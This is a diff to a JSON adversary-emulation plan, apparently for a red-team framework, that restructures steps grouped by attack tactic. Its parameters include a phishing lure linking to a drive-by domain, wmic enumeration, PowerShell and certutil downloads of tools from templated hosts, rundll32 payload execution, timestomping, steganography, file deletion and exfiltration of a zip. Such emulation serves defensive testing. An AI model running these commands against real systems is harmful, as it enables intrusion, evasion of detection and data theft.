@@ -14,7 +14,8 @@
             "label": "actuator",
             "preconditions": {
                 "tool": "self.tool_name"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -24,7 +25,8 @@
                 "tool": "self.tool",
                 "exfil": "self.exfil",
                 "driveby": "self.driveby"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -34,7 +36,8 @@
                 "tool": "self.tool",
                 "exfil": "self.exfil",
                 "driveby": "self.driveby"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -46,7 +49,8 @@
                 "exfiltration": "self.exfil",
                 "driveby": "self.driveby",
                 "driveby_ctl": "self.chimera"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -54,7 +58,8 @@
             "label": "Interfaces2",
             "preconditions": {
                 "driveby": "self.driveby2"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -62,7 +67,8 @@
             "label": "DNS2",
             "preconditions": {
                 "driveby": "self.driveby2"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -72,7 +78,8 @@
                 "payload": "self.tool_name2",
                 "driveby": "self.driveby2",
                 "driveby_ctl": "self.chimera"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -80,7 +87,8 @@
             "label": "Interfaces3",
             "preconditions": {
                 "driveby": "self.driveby3"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -88,7 +96,8 @@
             "label": "DNS3",
             "preconditions": {
                 "driveby": "self.driveby3"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -98,7 +107,8 @@
                 "payload": "self.tool_name3",
                 "driveby": "self.driveby3",
                 "driveby_ctl": "self.chimera"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -106,7 +116,8 @@
             "label": "Interfaces4",
             "preconditions": {
                 "driveby": "self.driveby4"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -114,7 +125,8 @@
             "label": "DNS4",
             "preconditions": {
                 "driveby": "self.driveby4"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -124,7 +136,8 @@
                 "payload": "self.tool_name4",
                 "driveby": "self.driveby4",
                 "driveby_ctl": "self.chimera"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -132,7 +145,8 @@
             "label": "Interfaces5",
             "preconditions": {
                 "driveby": "self.driveby5"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -140,7 +154,8 @@
             "label": "DNS5",
             "preconditions": {
                 "driveby": "self.driveby5"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -150,7 +165,8 @@
                 "payload": "self.tool_name5",
                 "driveby": "self.driveby5",
                 "driveby_ctl": "self.chimera"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -158,7 +174,8 @@
             "label": "Payload",
             "preconditions": {
                 "tool": "self.tool"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "InitialAccess",
@@ -169,7 +186,8 @@
                 "tool": "self.tool",
                 "driveby": "self.driveby",
                 "target": "self.target_1"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Execution",
@@ -180,7 +198,8 @@
                 "tool": "self.tool",
                 "driveby": "self.driveby",
                 "target": "self.target_1"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "c2",
@@ -191,7 +210,8 @@
                 "tool": "self.tool",
                 "driveby": "self.driveby",
                 "target": "self.target_1"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "InitialAccess",
@@ -202,10 +222,10 @@
                 "phishing": "self.phish_1",
                 "tool": "self.tool",
                 "driveby": "self.driveby",
-                "target": "self.target_1",
-                "tune": {
-                    "body": "Check out our discount code!\nhttp://${self.driveby_domain2}/${self.tool_name2}Bing Shopping"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "body": "Check out our discount code!\nhttp://${self.driveby_domain2}/${self.tool_name2}Bing Shopping"
             }
         },
         {
@@ -215,10 +235,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "cmd /c wmic qfe list && wmic useraccount list && wmic group list && echo \" \""
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "cmd /c wmic qfe list && wmic useraccount list && wmic group list && echo \" \""
             }
         },
         {
@@ -229,7 +249,8 @@
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
                 "target": "self.target_1"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "c2",
@@ -238,10 +259,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{$fp = \"$($(Get-PSDrive | where{$_.DisplayRoot -match '\\\\'}).DisplayRoot)\\${self.tool_name3}\"; wget -O $fp http://${self.driveby_domain3}/${self.tool_name3}; echo \" \"}"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{$fp = \"$($(Get-PSDrive | where{$_.DisplayRoot -match '\\\\'}).DisplayRoot)\\${self.tool_name3}\"; wget -O $fp http://${self.driveby_domain3}/${self.tool_name3}; echo \" \"}"
             }
         },
         {
@@ -251,12 +272,12 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "file_name": "self.tool_name3",
-                    "output_directory": "self.temp_dir_name",
-                    "output_file_name": "self.tool_name3"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "file_name": "self.tool_name3",
+                "output_directory": "self.temp_dir_name",
+                "output_file_name": "self.tool_name3"
             }
         },
         {
@@ -266,10 +287,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{$NewDate = (Get-Date '01/01/1969 01:01am'); $TSFile = gci -hidden${self.temp_dir_name}\\${self.tool_name3}; $TSFile.LastWriteTime = $NewDate; $TSFile.CreationTime = $NewDate; $TSFile.LastAccessTime = $NewDate; echo \" \"}"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{$NewDate = (Get-Date '01/01/1969 01:01am'); $TSFile = gci -hidden${self.temp_dir_name}\\${self.tool_name3}; $TSFile.LastWriteTime = $NewDate; $TSFile.CreationTime = $NewDate; $TSFile.LastAccessTime = $NewDate; echo \" \"}"
             }
         },
         {
@@ -279,12 +300,12 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "steg_filepath": "self.temp_dir_name${\\}self.tool_name3",
-                    "success_override": true,
-                    "kill": false
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "steg_filepath": "self.temp_dir_name${\\}self.tool_name3",
+                "success_override": true,
+                "kill": false
             }
         },
         {
@@ -294,10 +315,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "cmd /c del${self.temp_dir_name}\\${self.tool_name3}&& echo ' '"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "cmd /c del${self.temp_dir_name}\\${self.tool_name3}&& echo ' '"
             }
         },
         {
@@ -310,7 +331,8 @@
                 "tool": "self.tool",
                 "target_1": "self.target_1",
                 "target_2": "self.target_1_elevated"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "c2",
@@ -321,7 +343,8 @@
                 "tool": "self.tool",
                 "driveby": "self.driveby",
                 "target": "self.target_1_elevated"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "DefenseEvasion",
@@ -331,7 +354,8 @@
                 "agent": "self.agent_tgt1_elevated",
                 "tool": "self.tool",
                 "target": "self.target_1_elevated"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "c2",
@@ -340,10 +364,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "cmd /c certutil.exe -urlcache -split -f http://${self.driveby_domain5}/${self.tool_name5}${self.temp_dir_name}\\${self.tool_name5}&& echo \" \""
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "cmd /c certutil.exe -urlcache -split -f http://${self.driveby_domain5}/${self.tool_name5}${self.temp_dir_name}\\${self.tool_name5}&& echo \" \""
             }
         },
         {
@@ -353,12 +377,12 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "cmd /c rundll32 desk.cpl,InstallScreenSaver${self.temp_dir_name}\\${self.tool_name5}&& echo \" \"",
-                    "success_override": true,
-                    "kill": false
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "cmd /c rundll32 desk.cpl,InstallScreenSaver${self.temp_dir_name}\\${self.tool_name5}&& echo \" \"",
+                "success_override": true,
+                "kill": false
             }
         },
         {
@@ -369,7 +393,8 @@
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
                 "target": "self.target_1"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Exfiltration",
@@ -379,10 +404,10 @@
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
                 "target": "self.target_1",
-                "exfil": "self.exfil",
-                "tune": {
-                    "exfil_file": "C:\\Users\\Public\\WsmPty.zip"
-                }
+                "exfil": "self.exfil"
+            },
+            "tune": {
+                "exfil_file": "C:\\Users\\Public\\WsmPty.zip"
             }
         },
         {
@@ -392,11 +417,11 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "url": "self.driveby_domain4",
-                    "file_name": "self.tool_name4"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "url": "self.driveby_domain4",
+                "file_name": "self.tool_name4"
             }
         },
         {
@@ -407,7 +432,8 @@
                 "agent": "self.agent_tgt1_elevated",
                 "tool": "self.tool",
                 "target": "self.target_1_elevated"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Utility",
@@ -417,7 +443,8 @@
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
                 "target": "self.target_1"
-            }
+            },
+            "tune": null
         }
     ],
     "iocs": {
